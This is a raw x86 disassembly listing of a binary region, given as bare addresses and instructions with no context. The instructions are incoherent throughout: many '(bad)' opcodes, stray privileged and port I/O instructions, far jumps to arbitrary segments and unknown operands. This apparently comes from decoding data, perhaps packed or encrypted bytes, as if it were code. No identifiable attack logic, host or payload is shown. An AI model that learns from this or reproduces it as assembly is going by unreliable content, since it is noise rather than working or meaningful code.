  41af03:	mov    ecx,cs
  41af05:	stos   BYTE PTR es:[edi],al
  41af06:	loope  0x41af72
  41af08:	adc    BYTE PTR [edx],cl
  41af0a:	and    ecx,ebp
  41af0c:	or     DWORD PTR [edi+0x69],ecx
  41af0f:	repz sbb bh,BYTE PTR [ebp-0x52]
  41af13:	into   
  41af14:	xchg   DWORD PTR [ebx-0x1e],esi
  41af17:	mov    edx,eax
  41af19:	shl    DWORD PTR [ebx+0x28],0xb3
  41af1d:	imul   esp,DWORD PTR [edx],0xffffffb0
  41af20:	retf   0x238f
  41af23:	jnp    0x41af85
  41af25:	and    BYTE PTR [edi],dl
  41af27:	ror    DWORD PTR [edx],1
  41af29:	inc    ebp
  41af2a:	je     0x41af6e
  41af2c:	fbstp  TBYTE PTR [ecx-0x16]
  41af2f:	ja     0x41af03
  41af31:	or     BYTE PTR [edx],bl
  41af33:	std    
  41af34:	inc    edi
  41af35:	in     eax,0x44
  41af37:	test   edx,0xc619f5de
  41af3d:	or     ecx,eax
  41af3f:	sub    BYTE PTR [ebx],ch
  41af41:	dec    esp
  41af42:	rol    BYTE PTR [esi+0x77e84496],cl
  41af48:	xor    BYTE PTR ds:0xb07b9f74,al
  41af4e:	adc    DWORD PTR [ecx+ecx*2+0x36],ecx
  41af52:	nop
  41af53:	mov    ds:0x961d67c1,al
  41af58:	push   edx
  41af59:	retf   0x2598
  41af5c:	or     BYTE PTR [ebx],ch
  41af5e:	push   ebp
  41af5f:	mov    dl,0x0
  41af61:	add    BYTE PTR [eax],al
  41af63:	add    BYTE PTR [eax],al
  41af65:	add    bl,ah
  41af67:	push   es
  41af68:	add    DWORD PTR [edi-0x1b],esi
  41af6b:	ja     0x41af64
  41af6d:	xchg   esi,eax
  41af6e:	popf   
  41af6f:	mov    edx,0x4195c648
  41af74:	pop    esp
  41af75:	add    bh,BYTE PTR [ecx]
  41af77:	test   eax,0x7220001
  41af7c:	add    BYTE PTR [eax],al
  41af7e:	mov    al,ds:0xef005082
  41af83:	mov    edx,0xbb72dc38
  41af88:	pop    ds
  41af89:	gs call 0xe8b9:0x9abaa2c7
  41af91:	cmp    BYTE PTR [ecx],ah
  41af93:	add    DWORD PTR [ecx+ecx*2-0x25],0xffffffc7
  41af98:	or     BYTE PTR [ebx-0x5c2c3427],cl
  41af9e:	lods   eax,DWORD PTR ds:[esi]
  41af9f:	cmp    BYTE PTR [esi+0x1d0f70d],ch
  41afa5:	out    dx,eax
  41afa6:	push   ebp
  41afa7:	inc    eax
  41afa8:	pop    ss
  41afa9:	test   eax,0x46680d27
  41afae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afaf:	pop    ecx
  41afb0:	xchg   ebx,eax
  41afb1:	pusha  
  41afb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afb3:	(bad)
  41afb8:	cmp    edx,ebx
  41afba:	pop    ebx
  41afbb:	stc    
  41afbc:	push   ebp
  41afbd:	(bad)  
  41afbe:	jp     0x41aff4
  41afc0:	mov    WORD PTR [ecx-0x15acc166],fs
  41afc6:	out    dx,eax
  41afc7:	cli    
  41afc8:	cmp    BYTE PTR [ebx+0x5c50dda5],0xc1
  41afcf:	aam    0x6
  41afd1:	push   ss
  41afd2:	xor    esp,DWORD PTR [ecx+0x35df7f26]
  41afd8:	mov    cl,0xe0
  41afda:	pop    ss
  41afdb:	call   0xe316a2ba
  41afe0:	fwait
  41afe1:	retf   
  41afe2:	sbb    cl,BYTE PTR [ebp+0x11]
  41afe5:	sti    
  41afe6:	out    0xf1,al
  41afe8:	test   al,0x16
  41afea:	xchg   ebp,eax
  41afeb:	push   edx
  41afec:	mov    fs,WORD PTR ds:0x6534160b
  41aff2:	mov    DWORD PTR [ebx-0x7925ab53],esp
  41aff8:	pop    edi
  41aff9:	sar    DWORD PTR [edi-0x5f],1
  41affc:	sti    
  41affd:	mov    eax,0x5d2ed0ab
  41b002:	shl    ah,cl
  41b004:	inc    esi
  41b005:	and    al,0xab
  41b007:	jmp    0x41aff2
  41b009:	adc    al,0x61
  41b00b:	push   edi
  41b00c:	(bad)  
  41b00d:	dec    DWORD PTR [ebp-0x3e]
  41b010:	scas   eax,DWORD PTR es:[edi]
  41b011:	mov    cl,0x93
  41b013:	or     BYTE PTR [edi+0x39],dl
  41b016:	mov    edx,0xc34e43e5
  41b01b:	into   
  41b01c:	jnp    0x41b016
  41b01e:	sub    al,0x5
  41b020:	jmp    0xc5559cda
  41b025:	cdq    
  41b026:	inc    edi
  41b027:	sub    eax,0xef34cfeb
  41b02c:	jns    0x41b099
  41b02e:	push   ecx
  41b02f:	and    ch,dh
  41b031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b032:	mov    ah,0x26
  41b034:	mov    ebp,0x2c0a5fed
  41b039:	shl    BYTE PTR [ecx+0x56117897],cl
  41b03f:	aad    0xf7
  41b041:	sbb    BYTE PTR [edi+0x7b538461],dl
  41b047:	(bad)  
  41b048:	mov    ecx,0x5c4d787c
  41b04d:	jbe    0x41b02b
  41b04f:	fcomp  DWORD PTR [ebp-0x2a]
  41b052:	sub    DWORD PTR [esi+0x62a8ebe8],ebp
  41b058:	icebp  
  41b059:	jmp    0x4656:0xcf6297ae
  41b060:	or     DWORD PTR ds:0xc17bfa33,edx
  41b066:	mov    cl,0x75
  41b068:	in     eax,0xd8
  41b06a:	loopne 0x41b0bf
  41b06c:	daa    
  41b06d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b06e:	cdq    
  41b06f:	xor    BYTE PTR [ecx+0x37ed5ade],dh
  41b075:	mov    ?,ebp
  41b077:	pop    ebx
  41b078:	pop    ss
  41b079:	adc    eax,DWORD PTR [edx]
  41b07b:	jnp    0x41b027
  41b07d:	mov    ebx,0xee19313a
  41b082:	and    ecx,ebp
  41b084:	(bad)  
  41b085:	cmp    DWORD PTR [eax+0x5f],ebx
  41b088:	sub    ebx,DWORD PTR [eax-0x54]
  41b08b:	and    dl,BYTE PTR [edx+0x3bcb35ae]
  41b091:	jmp    0xd31f34a3
  41b096:	jne    0x41b040
  41b098:	pop    edi
  41b099:	xchg   edx,eax
  41b09a:	sbb    DWORD PTR [ebp-0x6e4c6c34],ebp
  41b0a0:	das    
  41b0a1:	jmp    0xffb1:0x2ddc0ca6
  41b0a8:	push   esi
  41b0a9:	ret    0x6c11
  41b0ac:	mov    ds:0x25006e43,eax
  41b0b1:	inc    esp
  41b0b2:	fcom   QWORD PTR [edx]
  41b0b4:	lea    esp,cs:[esi+0x433e6be9]
  41b0bb:	adc    DWORD PTR [eax+0x7e],0xffffffb1
  41b0bf:	in     al,dx
  41b0c0:	fmul   QWORD PTR [ebx+0x331879d6]
  41b0c6:	jge    0x41b0f6
  41b0c8:	dec    ebx
  41b0c9:	gs mov cl,0x61
  41b0cc:	xor    eax,DWORD PTR [esi+0x6d3b1f06]
  41b0d2:	mov    bl,0xf9
  41b0d4:	cmp    dl,BYTE PTR [eax-0x7]
  41b0d7:	cmp    eax,0x541ec912
  41b0dc:	shl    BYTE PTR [ebx+eax*4],0xcf
  41b0e0:	sub    DWORD PTR [edi-0xffa1074],0xdcfa8b13
  41b0ea:	push   ebp
  41b0eb:	out    dx,eax
  41b0ec:	push   ebp
  41b0ed:	shl    BYTE PTR [edi-0x77],1
  41b0f0:	and    eax,0x90fa5bc
  41b0f5:	in     al,dx
  41b0f6:	jns    0x41b082
  41b0f8:	sbb    BYTE PTR [ebx-0x5be5045f],dl
  41b0fe:	int3   
  41b0ff:	icebp  
  41b100:	outs   dx,BYTE PTR ds:[esi]
  41b101:	mov    dh,0x19
  41b103:	pop    ds
  41b104:	jp     0x41b16b
  41b106:	int3   
  41b107:	xor    cl,BYTE PTR [esi-0x2a670855]
  41b10d:	inc    ebx
  41b10e:	jbe    0x41b09c
  41b110:	mov    ch,0x22
  41b112:	sub    al,0x9e
  41b114:	xchg   ebx,eax
  41b115:	std    
  41b116:	fs and ch,dh
  41b119:	pop    ds
  41b11a:	xlat   BYTE PTR ds:[ebx]
  41b11b:	adc    BYTE PTR [edx],dh
  41b11d:	shl    ebp,0x78
  41b120:	lahf   
  41b121:	and    esp,ecx
  41b123:	imul   eax,DWORD PTR [ebx-0x245223d6],0x65d6aff9
  41b12d:	neg    BYTE PTR [eax-0x68adee92]
  41b133:	cmc    
  41b134:	aaa    
  41b135:	push   0x3f0236
  41b13a:	jmp    0x65314e9
  41b13f:	xor    ebx,DWORD PTR [esi+eiz*4-0x3268e217]
  41b146:	aam    0x58
  41b148:	lea    ecx,[esi-0x6f]
  41b14b:	push   ss
  41b14c:	xchg   edi,eax
  41b14d:	retf   0xeacc
  41b150:	mov    ds:0xaa0cc708,eax
  41b155:	cmp    BYTE PTR [esi-0x2b],ah
  41b158:	in     al,dx
  41b159:	sti    
  41b15a:	xlat   BYTE PTR ds:[ebx]
  41b15b:	xchg   ebx,eax
  41b15c:	in     eax,dx
  41b15d:	out    dx,al
  41b15e:	and    edi,DWORD PTR ss:[eax+0x58]
  41b162:	and    ecx,esp
  41b164:	add    edi,DWORD PTR [eax]
  41b166:	mov    ecx,ecx
  41b168:	loop   0x41b13e
  41b16a:	not    BYTE PTR [esi]
  41b16c:	(bad)
  41b170:	shl    DWORD PTR [ebp-0x59],0x95
  41b174:	inc    esp
  41b175:	gs leave 
  41b177:	add    eax,0x3035363f
  41b17c:	es or  al,0x46
  41b17f:	xor    bh,BYTE PTR [edx+0x24]
  41b182:	or     eax,0x8fb186b9
  41b187:	push   ebp
  41b188:	sub    edi,esi
  41b18a:	sbb    eax,0x3fc52417
  41b18f:	ret    0x14cc
  41b192:	mov    esp,0x42759616
  41b197:	bound  edx,QWORD PTR [esi-0x17]
  41b19a:	pop    esp
  41b19b:	adc    DWORD PTR [edi+0x8351802],0xffffffae
  41b1a2:	rcl    DWORD PTR [ebp-0xc],cl
  41b1a5:	sti    
  41b1a6:	mov    BYTE PTR [edx],dl
  41b1a8:	ins    DWORD PTR es:[edi],dx
  41b1a9:	mov    dl,0x61
  41b1ab:	jp     0x41b1b4
  41b1ad:	jecxz  0x41b21b
  41b1af:	pop    dx
  41b1b1:	imul   esi,DWORD PTR [ebp-0x41316671],0x8e45f94d
  41b1bb:	adc    dh,cl
  41b1bd:	stc    
  41b1be:	jle    0x41b206
  41b1c0:	dec    esp
  41b1c1:	xor    eax,0xa7b893b8
  41b1c6:	sbb    eax,0x6dd3eb5d
  41b1cb:	xor    edi,DWORD PTR [edi+0x4d]
  41b1ce:	loopne 0x41b246
  41b1d0:	(bad)  
  41b1d1:	ficom  WORD PTR [ebp-0x723ee65]
  41b1d7:	push   ecx
  41b1d8:	bound  edx,QWORD PTR [edx-0x2e]
  41b1db:	jbe    0x41b1cc
  41b1dd:	in     eax,0x93
  41b1df:	jnp    0x41b1af
  41b1e1:	push   ebp
  41b1e2:	icebp  
  41b1e3:	and    al,cl
  41b1e5:	sar    DWORD PTR [edi+0x3a],0x28
  41b1e9:	inc    ebp
  41b1ea:	(bad)  
  41b1eb:	or     eax,DWORD PTR [esi-0x11]
  41b1ee:	in     al,0x4e
  41b1f0:	cmp    bl,BYTE PTR [ecx]
  41b1f2:	outs   dx,DWORD PTR ds:[esi]
  41b1f3:	sahf   
  41b1f4:	rol    DWORD PTR [ecx-0x79741267],1
  41b1fa:	adc    al,0xa4
  41b1fc:	addr16 cdq 
  41b1fe:	mov    ebx,0x9a2b6ba4
  41b203:	push   0xc64dc17
  41b208:	lea    esp,[ecx-0x4]
  41b20b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b20c:	mov    ds:0x56f225d0,al
  41b211:	pusha  
  41b212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b213:	pop    esi
  41b214:	lock out 0x1d,al
  41b217:	pop    eax
  41b218:	xlat   BYTE PTR ds:[ebx]
  41b219:	push   ds
  41b21a:	add    eax,0xd957aa48
  41b21f:	jns    0x41b1e5
  41b221:	dec    edi
  41b222:	jp     0x41b285
  41b224:	inc    ebp
  41b225:	sbb    DWORD PTR [ebp-0x70431a],edx
  41b22b:	outs   dx,BYTE PTR ds:[esi]
  41b22c:	test   al,0x76
  41b22e:	pop    es
  41b22f:	bound  esp,QWORD PTR [eax+0xdb44ce6]
  41b235:	inc    eax
  41b236:	xchg   DWORD PTR [edi+0x12],ebx
  41b239:	lods   eax,DWORD PTR ds:[esi]
  41b23a:	adc    DWORD PTR [ecx-0x6f],esp
  41b23d:	push   es
  41b23e:	imul   eax,DWORD PTR [ecx],0xfffffffc
  41b241:	lods   al,BYTE PTR ds:[esi]
  41b242:	mov    esp,0x71a45d1f
  41b247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b248:	and    edx,DWORD PTR ds:0xa8731516
  41b24e:	dec    esp
  41b24f:	(bad)  
  41b250:	out    0xaa,eax
  41b252:	mov    cl,cl
  41b254:	mov    edi,0x7f156765
  41b259:	xchg   esi,eax
  41b25a:	mov    esi,0xc9c0cad9
  41b25f:	cli    
  41b260:	xor    DWORD PTR [esi],ebp
  41b262:	retf   0x92d6
  41b265:	or     ch,BYTE PTR [esi+0x15ac5fbb]
  41b26b:	mov    ds:0xc54471e6,al
  41b270:	lar    esi,bx
  41b273:	lods   eax,DWORD PTR ds:[esi]
  41b274:	cmp    al,0x9d
  41b276:	mov    ebx,0x47779e79
  41b27b:	sbb    BYTE PTR [esi+0x3854acf9],0x39
  41b282:	cli    
  41b283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b284:	xor    BYTE PTR [ebp-0x4fc72541],bh
  41b28a:	iret   
  41b28b:	je     0x41b2c8
  41b28d:	outs   dx,BYTE PTR ds:[esi]
  41b28e:	jno    0x41b2b5
  41b290:	mov    ebx,0x43cc3054
  41b295:	xchg   edx,eax
  41b296:	cwde   
  41b297:	sub    dh,dh
  41b299:	in     eax,dx
  41b29a:	add    BYTE PTR [eax-0x17ec613f],ah
  41b2a0:	sub    ebp,eax
  41b2a2:	je     0x41b226
  41b2a4:	(bad)  [edi+0x5e583969]
  41b2aa:	ins    DWORD PTR es:[edi],dx
  41b2ab:	mov    ds:0x49ffe389,eax
  41b2b0:	fs mov cl,0x81
  41b2b3:	(bad)  
  41b2b4:	loop   0x41b2bf
  41b2b6:	adc    BYTE PTR ds:0xf9081c7b,0xf
  41b2bd:	loop   0x41b24c
  41b2bf:	ret    
  41b2c0:	mov    BYTE PTR [esi-0x66],bl
  41b2c3:	imul   BYTE PTR [esi+ebx*1]
  41b2c6:	addr16 ss dec esi
  41b2c9:	out    dx,al
  41b2ca:	imul   esi,DWORD PTR [edx-0x2259ad8a],0xb2220e0
  41b2d4:	or     ecx,0xffffff85
  41b2d7:	jle    0x41b26a
  41b2d9:	aam    0xf8
  41b2db:	mov    ah,0x15
  41b2dd:	aad    0xa3
  41b2df:	adc    eax,0x4c9a3049
  41b2e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e5:	sbb    al,0xbb
  41b2e7:	or     ecx,0x75447d87
  41b2ed:	adc    al,0x53
  41b2ef:	sub    eax,0x216fb82
  41b2f4:	and    ecx,DWORD PTR [eax]
  41b2f6:	mov    bh,0x62
  41b2f8:	mov    bl,bl
  41b2fa:	mov    ebx,0x4f51fa4d
  41b2ff:	int3   
  41b300:	inc    ebp
  41b301:	jp     0x41b33a
  41b303:	add    BYTE PTR [ecx-0x25a40719],0x4a
  41b30a:	mov    ebp,0x76f59e8e
  41b30f:	je     0x41b315
  41b311:	shr    BYTE PTR [eax-0x77],cl
  41b314:	push   0x9ff0d737
  41b319:	loop   0x41b342
  41b31b:	dec    eax
  41b31c:	mov    edi,0x8094ae2f
  41b321:	inc    esi
  41b322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b323:	or     al,0x56
  41b325:	dec    esi
  41b326:	scas   ax,WORD PTR es:[edi]
  41b328:	es push 0xffffff92
  41b32b:	mov    edx,0xa64fd9c3
  41b330:	mov    ebx,0x58567842
  41b335:	in     al,dx
  41b336:	dec    edx
  41b337:	ror    DWORD PTR [ebx+0x3a],0x1d
  41b33b:	(bad)  
  41b33c:	and    al,0x9c
  41b33e:	mov    edi,0xf0a13c33
  41b343:	into   
  41b344:	out    0xd1,eax
  41b346:	mov    esi,DWORD PTR [ebx-0x20]
  41b349:	ret    
  41b34a:	sti    
  41b34b:	add    BYTE PTR [ebp-0x6df54a41],bl
  41b351:	sbb    al,0x5d
  41b353:	addr16 or bh,bl
  41b356:	push   edi
  41b357:	mov    eax,0x6126b7e4
  41b35c:	(bad)  
  41b35d:	and    ecx,DWORD PTR [esi-0x20388aaa]
  41b363:	sar    dh,0x38
  41b366:	loope  0x41b31a
  41b368:	push   ecx
  41b369:	hlt    
  41b36a:	jns    0x41b374
  41b36c:	and    al,0x94
  41b36e:	sti    
  41b36f:	pop    edx
  41b370:	ficomp DWORD PTR [ebp-0x60c844db]
  41b377:	retf   
  41b378:	mov    esi,0x3f07150f
  41b37d:	arpl   WORD PTR [ebp-0x5a],ax
  41b380:	or     eax,0x101f33a5
  41b385:	push   0x8d18d5dc
  41b38a:	push   es
  41b38b:	retf   0x8e08
  41b38e:	std    
  41b38f:	outs   dx,DWORD PTR ds:[esi]
  41b390:	inc    esi
  41b391:	jp     0x41b3f0
  41b393:	adc    esp,DWORD PTR [edx]
  41b395:	imul   ebx
  41b397:	ds out 0xcd,eax
  41b39a:	mulps  xmm0,XMMWORD PTR [edx]
  41b39d:	xchg   ebx,eax
  41b39e:	dec    ebx
  41b39f:	push   0xff3a4690
  41b3a4:	jno    0x41b338
  41b3a6:	(bad)  
  41b3a7:	xchg   ebx,eax
  41b3a8:	ret    0xa33b
  41b3ab:	fnstenv [esi]
  41b3ad:	popf   
  41b3ae:	pushf  
  41b3af:	jae    0x41b34c
  41b3b1:	jnp    0x41b400
  41b3b3:	int    0xa
  41b3b5:	in     al,0x92
  41b3b7:	stos   DWORD PTR es:[edi],eax
  41b3b8:	mov    BYTE PTR [ebx],0xa1
  41b3bb:	cmp    eax,0x1f77d045
  41b3c0:	mov    esi,0x6a4fc1db
  41b3c5:	push   0xffffffd3
  41b3c7:	loopne 0x41b40d
  41b3c9:	lods   eax,DWORD PTR ds:[esi]
  41b3ca:	adc    eax,0xca0564be
  41b3cf:	fisubr WORD PTR [edx*8+0x67c0a6b8]
  41b3d6:	in     eax,0x2c
  41b3d8:	aam    0x3
  41b3da:	pop    ecx
  41b3db:	fbstp  TBYTE PTR [edx-0x25146788]
  41b3e1:	stc    
  41b3e2:	jle    0x41b423
  41b3e4:	fwait
  41b3e5:	inc    ebx
  41b3e6:	stc    
  41b3e7:	jne    0x41b377
  41b3e9:	stos   BYTE PTR es:[edi],al
  41b3ea:	xor    BYTE PTR [edi-0x3ce91065],cl
  41b3f0:	xchg   ebx,eax
  41b3f1:	in     eax,0x6
  41b3f3:	mov    ebp,0x2fe70014
  41b3f8:	xor    al,0x7c
  41b3fa:	repz retf 0xf4d6
  41b3fe:	jp     0x41b45e
  41b400:	ins    DWORD PTR es:[edi],dx
  41b401:	dec    esi
  41b402:	xor    eax,0xaaadce45
  41b407:	mov    bh,0x80
  41b409:	xchg   esi,eax
  41b40a:	test   al,0xe4
  41b40c:	out    0x46,al
  41b40e:	int3   
  41b40f:	xchg   edi,eax
  41b410:	jmp    0x41b408
  41b412:	cmp    dh,bh
  41b414:	inc    edx
  41b415:	or     al,0xb1
  41b417:	xchg   ecx,eax
  41b418:	mov    ds:0x359622a1,al
  41b41d:	in     eax,dx
  41b41e:	cmc    
  41b41f:	sub    ebx,DWORD PTR [edi]
  41b421:	fwait
  41b422:	jns    0x41b441
  41b424:	and    eax,0x5e940a6f
  41b429:	aam    0xac
  41b42b:	add    BYTE PTR [ecx],dh
  41b42d:	pusha  
  41b42e:	ror    BYTE PTR [ebx-0x5428682c],cl
  41b434:	popa   
  41b435:	mov    dl,0xe5
  41b437:	mov    BYTE PTR [edx+0x2e322e01],dl
  41b43d:	add    ebp,eax
  41b43f:	and    al,0x54
  41b441:	xchg   edx,eax
  41b442:	jnp    0x41b436
  41b444:	sbb    bl,cl
  41b446:	xchg   edx,eax
  41b447:	shl    DWORD PTR [ebp-0x15],1
  41b44a:	cmp    ecx,DWORD PTR [ebp*4-0x588a2a3f]
  41b451:	fld    TBYTE PTR [esi]
  41b453:	call   0x8c40:0xd525898a
  41b45a:	and    eax,0xf911327
  41b45f:	repnz imul eax,DWORD PTR [esi],0x8ba1e9a3
  41b466:	sti    
  41b467:	loopne 0x41b450
  41b469:	push   ecx
  41b46a:	outs   dx,BYTE PTR ds:[esi]
  41b46b:	(bad)  
  41b46c:	rcr    DWORD PTR [edx+0x16],1
  41b46f:	fwait
  41b470:	(bad)  
  41b471:	sbb    DWORD PTR [esi-0x5b],eax
  41b474:	(bad)  
  41b475:	sbb    al,0x7e
  41b477:	fdiv   st,st(4)
  41b479:	jbe    0x41b42a
  41b47b:	sbb    DWORD PTR ds:0x709b6513,eax
  41b481:	mov    ebp,0xa9953ab3
  41b486:	(bad)  
  41b488:	jg     0x41b4e2
  41b48a:	nop
  41b48b:	dec    eax
  41b48c:	std    
  41b48d:	fsub   st,st(2)
  41b48f:	sahf   
  41b490:	sub    edi,ebp
  41b492:	shr    BYTE PTR ds:0xd8042d86,0xc0
  41b499:	inc    edi
  41b49a:	mov    dh,0x83
  41b49c:	inc    ebx
  41b49d:	jecxz  0x41b4bb
  41b49f:	bound  edx,QWORD PTR [ecx+0x7c]
  41b4a2:	rcr    BYTE PTR ds:0x5161696a,0x5f
  41b4a9:	inc    ebp
  41b4aa:	sti    
  41b4ab:	fisttp QWORD PTR [ebp+eiz*1-0x6b]
  41b4af:	sbb    ebp,ebp
  41b4b1:	scas   eax,DWORD PTR es:[edi]
  41b4b2:	fsub   DWORD PTR [edx]
  41b4b4:	push   cs
  41b4b5:	pop    esp
  41b4b6:	in     al,dx
  41b4b7:	fwait
  41b4b8:	in     al,dx
  41b4b9:	xlat   BYTE PTR ds:[ebx]
  41b4ba:	ss call 0xdc28:0xf23edecf
  41b4c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4c3:	pop    esp
  41b4c4:	mov    edx,0xc7815fd5
  41b4c9:	xchg   esp,eax
  41b4ca:	add    ch,bh
  41b4cc:	ror    edi,1
  41b4ce:	cmp    dh,BYTE PTR [esi]
  41b4d0:	inc    ebp
  41b4d1:	sbb    ecx,DWORD PTR [ebx-0x1e4beb7b]
  41b4d7:	or     ebx,DWORD PTR [esi]
  41b4d9:	loop   0x41b4c0
  41b4db:	outs   dx,DWORD PTR ds:[esi]
  41b4dc:	sbb    eax,0xb27955cf
  41b4e1:	mov    ?,WORD PTR ds:0xe94f64c2
  41b4e7:	aas    
  41b4e8:	jae    0x41b4e9
  41b4ea:	xchg   ebx,eax
  41b4eb:	mov    esi,0x40dbadbf
  41b4f0:	retf   0x228a
  41b4f3:	call   0xa426733f
  41b4f8:	sbb    DWORD PTR ds:0x5c8201d2,ebp
  41b4fe:	test   BYTE PTR [edi+eax*1-0x38fb679],0xe4
  41b506:	dec    ebx
  41b507:	and    dl,al
  41b509:	call   0x4a446217
  41b50e:	xchg   esp,eax
  41b50f:	push   edx
  41b510:	dec    esp
  41b511:	jb     0x41b497
  41b513:	in     eax,0x6e
  41b515:	pusha  
  41b516:	xchg   ch,al
  41b518:	or     esi,DWORD PTR [esi-0x748881b4]
  41b51e:	and    ah,BYTE PTR [esi+0x1ca5116b]
  41b524:	push   ss
  41b525:	and    esi,DWORD PTR [edi-0x61]
  41b528:	loop   0x41b4d2
  41b52a:	mov    cl,0x79
  41b52c:	rcr    DWORD PTR [esi],1
  41b52e:	mov    ebp,0xe26fe11f
  41b533:	mov    dl,0x4f
  41b535:	(bad)  
  41b537:	mov    eax,ds:0x1a0f69db
  41b53c:	mov    ebx,0x4605c524
  41b541:	loop   0x41b569
  41b543:	inc    edx
  41b544:	je     0x41b520
  41b546:	inc    esp
  41b547:	jns    0x41b4ca
  41b549:	xchg   ebp,eax
  41b54a:	sub    dh,cl
  41b54c:	jno    0x41b58a
  41b54e:	mov    al,0x91
  41b550:	lods   eax,DWORD PTR ds:[esi]
  41b551:	xchg   ecx,eax
  41b552:	sbb    BYTE PTR [ebx],ah
  41b554:	and    eax,0x4f5cac61
  41b559:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41b55b:	sub    BYTE PTR [ebx],0x43
  41b55e:	push   ds
  41b55f:	adc    al,0xce
  41b561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b562:	fnstenv gs:[eax+edx*2-0x2f]
  41b567:	(bad)  
  41b569:	loopne 0x41b586
  41b56b:	into   
  41b56c:	mov    eax,ds:0xb205e061
  41b571:	imul   ecx,esi,0x46
  41b574:	pop    ds
  41b575:	mov    DWORD PTR [edx-0x41],edi
  41b578:	jbe    0x41b5b4
  41b57a:	inc    edi
  41b57b:	call   0x331aebc8
  41b580:	cmc    
  41b581:	and    cl,BYTE PTR [ecx+edx*1+0x21f9211a]
  41b588:	in     eax,dx
  41b589:	jmp    0x3d0e:0xd20dff35
  41b590:	int    0x7a
  41b592:	xchg   BYTE PTR [edi-0x5a182],ah
  41b598:	pop    ds
  41b599:	lods   eax,DWORD PTR ds:[esi]
  41b59a:	repnz inc esi
  41b59c:	cmp    al,0x20
  41b59e:	in     eax,0x18
  41b5a0:	sbb    DWORD PTR cs:[ecx],ebp
  41b5a3:	cdq    
  41b5a4:	xor    DWORD PTR [edi],eax
  41b5a6:	div    BYTE PTR [ecx+eiz*4-0x605f6443]
  41b5ad:	out    dx,eax
  41b5ae:	mov    dl,0x85
  41b5b0:	sbb    al,0x22
  41b5b2:	(bad)  
  41b5b3:	mov    al,ds:0x9b0e6c82
  41b5b8:	loop   0x41b560
  41b5ba:	xchg   ebp,eax
  41b5bb:	out    0x63,al
  41b5bd:	jbe    0x41b585
  41b5bf:	clc    
  41b5c0:	jne    0x41b57f
  41b5c2:	jb     0x41b569
  41b5c4:	(bad)  
  41b5c5:	sbb    al,0xdf
  41b5c7:	popf   
  41b5c8:	jbe    0x41b591
  41b5ca:	les    ebx,FWORD PTR [ebp+0xc]
  41b5cd:	pop    eax
  41b5cf:	mulps  xmm3,XMMWORD PTR [eax-0x4f87daf1]
  41b5d6:	fidivr DWORD PTR [ecx-0x1b6fab29]
  41b5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5dd:	cmp    cl,BYTE PTR [ecx]
  41b5df:	arpl   WORD PTR [ebp+0x1ea857f0],sp
  41b5e5:	gs inc ebp
  41b5e7:	mov    cl,0x8d
  41b5e9:	call   0x534f:0xe1757d7
  41b5f0:	mov    al,ds:0x2fac807f
  41b5f5:	add    BYTE PTR [edi+0x37675643],bl
  41b5fb:	(bad)  
  41b5fc:	or     DWORD PTR [edi-0x21],edx
  41b5ff:	icebp  
  41b600:	xchg   DWORD PTR [edx+0x26b8c2a0],esp
  41b606:	add    DWORD PTR [esi-0x7b41b6d6],0xbbd0e98
  41b610:	daa    
  41b611:	cmc    
  41b612:	and    cl,BYTE PTR ds:0x5a3684d4
  41b618:	aad    0xb1
  41b61a:	(bad)  
  41b61c:	jns    0x41b657
  41b61e:	pop    edi
  41b61f:	cmp    DWORD PTR [ebx],ebx
  41b621:	add    DWORD PTR [esi],ecx
  41b623:	repz fiadd DWORD PTR [ebp+0x47]
  41b627:	mov    al,0xd6
  41b629:	pop    ecx
  41b62a:	fisub  DWORD PTR [edx-0x10a268b9]
  41b630:	sbb    esi,DWORD PTR [ebx+0x71]
  41b633:	ss clc 
  41b635:	jl     0x41b627
  41b637:	dec    ebp
  41b638:	mov    edi,0xd1f47951
  41b63d:	or     BYTE PTR [edx+0x2883ac72],bl
  41b643:	inc    edi
  41b644:	push   ebx
  41b645:	xor    al,0x62
  41b647:	imul   ch
  41b649:	sbb    eax,0xb6c6b6cb
  41b64e:	push   0xfffffffa
  41b650:	pushf  
  41b651:	jp     0x41b650
  41b653:	and    DWORD PTR [eax+0x47fcc1a2],eax
  41b659:	(bad)  [edx-0xf]
  41b65c:	fwait
  41b65d:	stos   DWORD PTR es:[edi],eax
  41b65e:	jbe    0x41b686
  41b660:	push   edi
  41b661:	mov    ebx,0xce8ea122
  41b666:	dec    edx
  41b667:	pop    es
  41b668:	mov    ecx,0x87d31db2
  41b66d:	and    bl,BYTE PTR [edi-0x5877852c]
  41b673:	pop    ebp
  41b674:	iret   
  41b675:	xor    bl,BYTE PTR [edi-0xdda6ba8]
  41b67b:	clc    
  41b67c:	test   BYTE PTR [edx+0x12da657b],0x68
  41b683:	imul   ebp,DWORD PTR ds:0x89315f86,0xc26bf78a
  41b68d:	fdiv   st,st(5)
  41b68f:	adc    bh,ah
  41b691:	mov    edx,0xce761dc7
  41b696:	inc    ebx
  41b697:	xchg   esp,eax
  41b698:	xchg   edx,eax
  41b699:	dec    ecx
  41b69a:	jecxz  0x41b641
  41b69c:	loop   0x41b6f7
  41b69e:	jns    0x41b644
  41b6a0:	add    BYTE PTR [eax],al
  41b6a2:	add    BYTE PTR [eax],al
  41b6a4:	add    BYTE PTR [eax],al
  41b6a6:	pushf  
  41b6a7:	sbb    al,bl
  41b6a9:	push   esi
  41b6aa:	(bad)  
  41b6ac:	sahf   
  41b6ad:	fidivr DWORD PTR [esi-0x64]
  41b6b0:	add    al,ah
  41b6b2:	stos   DWORD PTR es:[edi],eax
  41b6b3:	cmp    ecx,0x1b05be5
  41b6b9:	add    BYTE PTR [edx],ah
  41b6bb:	pop    es
  41b6bc:	add    BYTE PTR [eax],al
  41b6be:	ja     0x41b694
  41b6c0:	dec    esp
